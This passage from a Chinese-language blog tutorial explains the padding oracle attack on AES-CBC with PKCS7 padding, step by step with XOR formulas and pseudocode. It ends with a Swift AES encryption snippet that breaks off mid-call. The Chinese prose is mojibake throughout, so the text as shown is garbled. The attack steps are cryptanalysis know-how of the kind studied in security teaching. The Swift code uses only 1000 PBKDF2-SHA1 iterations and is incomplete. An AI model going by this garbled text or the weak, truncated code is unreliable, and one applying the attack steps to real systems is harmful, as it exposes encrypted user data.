&lt;/div>&lt;p>è¿›ä¸€æ­¥ï¼Œå› ä¸º C1 æ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">P2[15] = C1[15] ^ I2[15]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> = C1[15] ^ 95
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è‡³æ­¤ï¼ŒP2[15] å·²ç»è®¡ç®—å‡ºæ¥äº†ï¼Œå³æœ€åä¸€ä¸ªå­—èŠ‚å·²ç»è¢«ç ´è§£äº†ï¼&lt;/p>
&lt;h3 id="ç ´è§£æœ€åä¸€ä¸ª-block-çš„å‰©ä½™å­—èŠ‚">ç ´è§£æœ€åä¸€ä¸ª block çš„å‰©ä½™å­—èŠ‚&lt;/h3>
&lt;p>ä¸ºäº†ç ´è§£å‰©ä½™å­—èŠ‚ï¼Œæˆ‘ä»¬å…ˆå¯ä»¥æŠŠ P2&amp;rsquo;[15] å®šä½ 2ï¼Œæ ¹æ® PKCS7Padding çš„å®šä¹‰ï¼Œå¦‚æœ padding æ˜¯åˆæ³•çš„ï¼Œåˆ™ P2&amp;rsquo;[14] ä¹Ÿä¸€å®šæ˜¯ 2ã€‚æˆ‘ä»¬å°±æ ¹æ®è¿™ä¸ªæ€è·¯æ¥ç ´è§£å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚ã€‚&lt;/p>
&lt;ol>
&lt;li>å…ˆæŠŠ C1&amp;rsquo;[0..14] ç½® 0ï¼ŒC1&amp;rsquo;[15] è®¾ç½®æˆ &lt;code>2 ^ I2[15]&lt;/code> ï¼ˆç¡®ä¿ P2&amp;rsquo;[15] æ˜¯ 2ï¼‰&lt;/li>
&lt;li>C1&amp;rsquo; + C2 ä¼ å…¥ Padding Oracleï¼Œæµ‹è¯•æˆåŠŸåˆ™è·³åˆ°ç¬¬ 4 æ­¥ï¼Œå¦åˆ™ç»§ç»­ä¸‹ä¸€æ­¥&lt;/li>
&lt;li>C1&amp;rsquo;[14] è‡ªå¢ï¼Œé‡å¤ç¬¬ 2 æ­¥&lt;/li>
&lt;li>æ ¹æ®ä»¥ä¸‹å…¬å¼è®¡ç®— I2[15]:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">I2 = C1&amp;#39; ^ P2&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I2[14] = C1&amp;#39;[14] ^ P2&amp;#39;[14]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> = C1&amp;#39;[14] ^ 2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç”±äº C1 æ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">P2[14] = C1[14] ^ I2[14]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è‡³æ­¤ï¼ŒP2[14] è®¡ç®—å‡ºæ¥äº†ï¼Œå³å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚è¢«ç ´è§£äº†ï¼&lt;/p>
&lt;p>é‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œå³å¯ç ´è§£æœ€åä¸€ä¸ª block çš„å‰©ä½™å­—èŠ‚ã€‚&lt;/p>
&lt;p>é‡å¤ä¸Šé¢ä¸¤èŠ‚çš„æ­¥éª¤ï¼Œå³å¯ç ´è§£æ‰€æœ‰ blockã€‚ç¬¬ä¸€ä¸ª block ç¨æœ‰ä¸åŒï¼Œå› ä¸ºç¬¬ä¸€ä¸ª block æ²¡æœ‰å¯¹åº”çš„ C1ï¼Œæ­¤æ—¶ï¼Œ C1 = IV ã€‚&lt;/p>
&lt;h3 id="ç¡®å®šæœ€åä¸€ä¸ªå­—èŠ‚çš„å€¼">ç¡®å®šæœ€åä¸€ä¸ªå­—èŠ‚çš„å€¼&lt;/h3>
&lt;p>æˆ‘ä»¬å›è¿‡å¤´æ¥çœ‹è¿™ä¸ªé—®é¢˜ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ï¼Œå¦‚æœæ­¤æ—¶ P2&amp;rsquo;[15] æ˜¯2è€Œä¸æ˜¯1ï¼Œæ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿæ ¹æ® PKCS7Padding çš„å®šä¹‰ï¼Œè¿™æ„å‘³ç€ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">P2&amp;#39;[14] == P2&amp;#39;[15] == 2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ³¨æ„æ­¤æ—¶ C1&amp;rsquo;[14] çš„å€¼æ˜¯ 0ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ C1&amp;rsquo;[14] çš„å€¼ï¼ˆä¾‹å¦‚ä¿®æ”¹æˆ1ï¼‰ï¼Œç„¶åå°† C1&amp;rsquo; + C2 ä¼ å…¥ Padding Oracle è¿›è¡Œæµ‹è¯•ï¼Œå¦‚æœé€šè¿‡åˆ™è¡¨ç¤º P2&amp;rsquo;[15] åªå¯èƒ½æ˜¯1ã€‚ä»€ä¹ˆåŸå› å‘¢ï¼Ÿå› ä¸º C1&amp;rsquo;[14] çš„å€¼è¢«ä¿®æ”¹åï¼Œå¿…ç„¶ä¼šå½±å“ P2&amp;rsquo;[14]ï¼Œè€Œå˜åŒ–åçš„ P2&amp;rsquo; ä»èƒ½é€šè¿‡æµ‹è¯•ï¼Œè¯´æ˜ Padding åªèƒ½æ˜¯ 1ï¼Œå¦åˆ™ P2&amp;rsquo;[14] != P2&amp;rsquo;[15] æ˜¯å¿…ç„¶é€šä¸è¿‡æµ‹è¯•çš„ã€‚å¦‚æœä¿®æ”¹åæ²¡æœ‰é€šè¿‡æµ‹è¯•å‘¢ï¼Ÿæ­¤æ—¶è¯´æ˜ P2&amp;rsquo;[14] &amp;gt;= 2ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦é‡å¤ä»¥ä¸Šæ­¥éª¤ï¼ˆæŠŠ C1&amp;rsquo;[14] é‡ç½®ä¸º0ï¼Œä¿®æ”¹ C1&amp;rsquo;[13] çš„å€¼ä¸º1ï¼‰å†åšä¸€é Padding æµ‹è¯•å³å¯ã€‚å¦‚æ­¤æœ€å¤šæµ‹è¯• 15 æ¬¡ï¼Œå³å¯ç¡®å®š P2&amp;rsquo;[15] çš„å€¼ã€‚æ­¥éª¤å¯å½’çº³å¦‚ä¸‹ï¼š&lt;/p>
&lt;ol>
&lt;li>i = 14, C1&amp;rsquo;[i] = 1&lt;/li>
&lt;li>PaddingOracle(C1&amp;rsquo; + C2) æ˜¯å¦æˆåŠŸï¼ŸæˆåŠŸè·³åˆ°ç¬¬ 4 æ­¥ï¼Œå¦åˆ™ç»§ç»­&lt;/li>
&lt;li>C1&amp;rsquo;[i] = 0, i -= 1, å¦‚æœ i &amp;lt; 0ï¼Œåˆ™è·³è½¬ç¬¬ 5 æ­¥ï¼›å¦åˆ™ C1&amp;rsquo;[i] = 1ï¼Œé‡å¤ç¬¬ 2 æ­¥&lt;/li>
&lt;li>æ ¹æ® PKCS7Padding çš„å®šä¹‰ï¼Œå¯ç¡®å®š P2&amp;rsquo;[15] çš„å€¼ä¸º 16 - i - 1ï¼Œç»“æŸ&lt;/li>
&lt;li>æ ¹æ® PKCS7Padding çš„å®šä¹‰ï¼Œå¯ç¡®å®š P2&amp;rsquo;[15] çš„å€¼ä¸º 16ï¼Œç»“æŸ&lt;/li>
&lt;/ol>
&lt;h2 id="ç¨‹åºå®ç°">ç¨‹åºå®ç°&lt;/h2>
&lt;p>ä½œä¸ºç»ƒä¹ å’Œæµ‹è¯•ï¼Œè¿™é‡Œç”¨ Python è¯­è¨€å®ç°äº†ä¸€ä¸ª Padding Oracle Attack çš„ Demoï¼Œè§ &lt;a href="https://github.com/mindeng/crypto-utils/tree/master/padding-oracle-attack">padding-oracle-attack&lt;/a> ã€‚&lt;/p>
&lt;h2 id="å‚è€ƒ">å‚è€ƒ&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="http://robertheaton.com/2013/07/29/padding-oracle-attack/">The Padding Oracle Attack - why crypto is terrifying&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth">Padding oracle attacks: in depth&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>ç¬¬ä¸€ç¯‡æ–‡ç« å†™çš„æ¯”è¾ƒç”ŸåŠ¨æ˜“ç†è§£ï¼Œå›¾æ–‡é…åˆçš„å¾ˆå¥½ï¼ˆæœ¬æ–‡å›¾ç‰‡å°±æ˜¯å¼•è‡ªè¿™é‡Œï¼‰ï¼Œç¼ºç‚¹æ˜¯æ²¡æœ‰æåˆ° P2&amp;rsquo;[15] å€¼çš„ç¡®å®šï¼Œç”šè‡³ç›´æ¥æ–­å®š P2&amp;rsquo;[15] == 1ï¼Œä¸å¤ªä¸¥è°¨ã€‚ç»æˆ‘ä¸ªäººæµ‹è¯•æ˜¯æœ‰å¯èƒ½å‡ºç°å…¶ä»–å€¼çš„ã€‚&lt;/p>
&lt;p>ç¬¬äºŒç¯‡æ–‡ç« å†™çš„æ¯”è¾ƒä¸¥è°¨ã€æ¯”è¾ƒå½¢å¼åŒ–ï¼Œä½†ä¹Ÿæ¯”è¾ƒæ¯ç‡¥ï¼Œæ²¡é‚£ä¹ˆå½¢è±¡ç”ŸåŠ¨ã€‚ä¸è¿‡è¿™ç¯‡æ–‡ç« æåˆ°äº† P2&amp;rsquo;[15] çš„ä¸ç¡®å®šæ€§ï¼Œè€Œä¸”ç®€å•ä»‹ç»äº†è§£å†³åŠæ³•ï¼ˆåœ¨Backtrackingä¸€èŠ‚ä¸­æœ‰ç®€å•è¯´æ˜ï¼‰ï¼Œä½†æœªåšè¯¦ç»†é˜è¿°ã€‚&lt;/p>
&lt;h2 id="é™„å½•">é™„å½•&lt;/h2>
&lt;p>AES with PBKDF2 &amp;amp; PKCS7Padding &amp;amp; CBC mode in Swift (iOS):&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-swift" data-lang="swift">&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">enum&lt;/span> &lt;span class="nc">CryptorError&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">ErrorType&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">PasswordError&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">RandomSaltError&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">AllocError&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">DeriveDataError&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">EncryptError&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">UnknownError&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">internal&lt;/span> &lt;span class="kd">func&lt;/span> &lt;span class="nf">AESEncrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">plaintext&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">NSData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">String&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kr">throws&lt;/span> &lt;span class="p">-&amp;gt;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">NSData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">NSData&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">guard&lt;/span> &lt;span class="kd">let&lt;/span> &lt;span class="nv">passwordData&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">NSData&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">dataUsingEncoding&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">NSUTF8StringEncoding&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">allowLossyConversion&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">CryptorError&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">PasswordError&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">operation&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">CCOperation&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">kCCEncrypt&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">options&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">UInt32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">kCCOptionPKCS7Padding&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">palintextLen&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">plaintext&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">plaintextBytes&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">UnsafePointer&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nb">Void&lt;/span>&lt;span class="p">&amp;gt;(&lt;/span>&lt;span class="n">plaintext&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">bytes&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">outBuffer&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">NSMutableData&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">Int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">palintextLen&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">algorithm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">requiredBlockSize&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="o">!&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">outBufferPtr&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">UnsafeMutablePointer&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nb">Void&lt;/span>&lt;span class="p">&amp;gt;(&lt;/span>&lt;span class="n">outBuffer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">mutableBytes&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">outBufferLen&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">size_t&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">outBuffer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nv">bytesDecrypted&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">SALT_LEN&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mi">16&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">guard&lt;/span> &lt;span class="kd">let&lt;/span> &lt;span class="nv">randomSalt&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">SymmetricCryptor&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">randomDataOfLength&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SALT_LEN&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">CryptorError&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">RandomSaltError&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">saltBytes&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">UnsafePointer&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nb">UInt8&lt;/span>&lt;span class="p">&amp;gt;(&lt;/span>&lt;span class="n">randomSalt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">bytes&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">saltLen&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">randomSalt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">guard&lt;/span> &lt;span class="kd">let&lt;/span> &lt;span class="nv">derivedData&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">NSMutableData&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">32&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">CryptorError&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AllocError&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">derivationResult&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">CCKeyDerivationPBKDF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">CCPBKDFAlgorithm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">kCCPBKDF2&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nb">UnsafePointer&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nb">Int8&lt;/span>&lt;span class="p">&amp;gt;(&lt;/span>&lt;span class="n">passwordData&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">bytes&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">passwordData&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">saltBytes&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">saltLen&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">CCPseudoRandomAlgorithm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">kCCPRFHmacAlgSHA1&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="mi">1000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">UnsafeMutablePointer&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nb">UInt8&lt;/span>&lt;span class="p">&amp;gt;(&lt;/span>&lt;span class="n">derivedData&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">mutableBytes&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">derivedData&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">guard&lt;/span> &lt;span class="nb">Int32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">derivationResult&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">==&lt;/span> &lt;span class="nb">Int32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">kCCSuccess&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">CryptorError&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">DeriveDataError&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">derivedKey&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">derivedData&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">subdataWithRange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">NSMakeRange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">derivedIV&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">derivedData&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">subdataWithRange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">NSMakeRange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Perform operation&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nv">cryptStatus&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">CCCrypt&lt;/span>&lt;span class="p">(&lt;/span>
